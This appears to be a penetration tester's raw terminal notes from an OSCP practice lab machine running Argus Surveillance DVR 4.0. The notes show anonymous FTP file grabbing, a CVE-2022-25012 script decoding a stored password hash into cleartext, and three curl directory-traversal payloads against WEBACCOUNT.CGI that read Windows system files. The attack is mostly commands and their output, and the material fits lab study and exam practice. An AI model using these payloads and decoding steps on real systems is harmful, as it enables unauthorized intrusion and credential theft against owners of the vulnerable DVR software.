```



└─$ 
┌──(bitsentry㉿kali)-[~/…/OSCP/exam_content/machine_111/nmap]
└─$ ftp 192.168.109.111                                                                                                                           
Connected to 192.168.109.111.
220 Microsoft FTP Service
Name (192.168.109.111:bitsentry): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||52405|)
125 Data connection already open; Transfer starting.
02-23-22  08:13AM                  145 .env
02-23-22  08:13AM                 2056 Acq.dll
02-24-22  06:24AM                 4868 DVRParams.ini
02-23-22  08:13AM                35996 Manifest.dll
02-23-22  08:13AM                20455 program.exe
02-23-22  08:15AM                40229 verisign.png
02-23-22  08:14AM                11446 wab.dll
226 Transfer complete.
ftp> get .env
local: .env remote: .env
229 Entering Extended Passive Mode (|||52408|)
125 Data connection already open; Transfer starting.
100% |************************************************************************************************************************************************************************|   145        1.14 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 8 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
145 bytes received in 00:00 (1.14 KiB/s)
ftp> get verisign.png
local: verisign.png remote: verisign.png
229 Entering Extended Passive Mode (|||52414|)
125 Data connection already open; Transfer starting.
100% |************************************************************************************************************************************************************************| 40229      161.21 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 153 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
40229 bytes received in 00:00 (160.52 KiB/s)
ftp> get DVRParams.ini
local: DVRParams.ini remote: DVRParams.ini
229 Entering Extended Passive Mode (|||52578|)
125 Data connection already open; Transfer starting.
100% |************************************************************************************************************************************************************************|  4868       38.73 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 201 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
4868 bytes received in 00:00 (38.71 KiB/s)
ftp> exit



----- https://github.com/s3l33/CVE-2022-25012/blob/main/CVE-2022-25012.py


                                                                                                                      
┌──(bitsentry㉿kali)-[~/…/OSCP/exam_content/machine_111/scripts]
└─$ python3 CVE-2022-25012.py 6FE0F539CA79E03BECB4D9BDF6413F7EC48C4AC3956BCA79ECB4EB60906BB4A1E1B0F539EB60E03BAAFECA79B734B398
/home/bitsentry/Documents/OSCP/exam_content/machine_111/scripts/CVE-2022-25012.py:48: SyntaxWarning: "\_" is an invalid escape sequence. Such sequences will not work in the future. Did you mean "\\_"? A raw string is also an option.
  #   /  _  \_______  ____  __ __  ______ #

#########################################
#    _____ Surveillance DVR 4.0         #
#   /  _  \_______  ____  __ __  ______ #
#  /  /_\  \_  __ \/ ___\|  |  \/  ___/ #
# /    |    \  | \/ /_/  >  |  /\___ \  #
# \____|__  /__|  \___  /|____//____  > #
#         \/     /_____/            \/  #
#        Weak Password Encryption       #
############ @deathflash1411 ############
#                                       #
# Updated by S3L33                      #
#########################################


[+] 6FE0:V
[+] F539:3
[+] CA79:r
[+] E03B:t
[+] ECB4:1
[+] D9BD:c
[+] F641:a
[+] 3F7E:l
[+] C48C:8
[+] 4AC3:S
[+] 956B:h
[+] CA79:r
[+] ECB4:1
[+] EB60:n
[+] 906B:k
[+] B4A1:2
[+] E1B0:C
[+] F539:3
[+] EB60:n
[+] E03B:t
[+] AAFE:u
[+] CA79:r
[+] B734:y
[+] B398:!

[+] Password: V3rt1cal8Shr1nk2C3ntury!



https://medium.com/@ardian.danny/oscp-practice-series-37-proving-grounds-dvr4-5c46a380d545


curl "http://192.168.109.111:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="


curl "http://192.168.109.111:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2FDrivers%2FProgram Files%2FAhsayCBS%2Fsystem%2Fobs&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="


curl "http://192.168.109.111:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FProgram%20Files%2FAhsayCBS%2Fsystem%2Fobs&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="



```




